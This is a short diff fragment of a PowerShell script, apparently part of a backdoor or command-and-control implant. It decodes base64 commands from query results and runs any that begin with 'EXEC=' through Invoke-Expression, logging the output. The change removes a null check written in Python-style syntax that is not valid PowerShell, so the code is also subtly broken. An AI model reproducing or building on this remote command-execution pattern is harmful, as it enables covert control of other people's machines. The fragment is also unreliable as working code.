@@ -11,9 +11,6 @@ function query(){
     $cmd = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($results[2]))
 }
 function runcommand(){
-    if ($cmd is None) {
-        query
-    }
     if ($cmd.StartsWith("EXEC=")){
         $exec = iex($cmd.substring(5))
         $logpath = $wp + "execlog.txt"
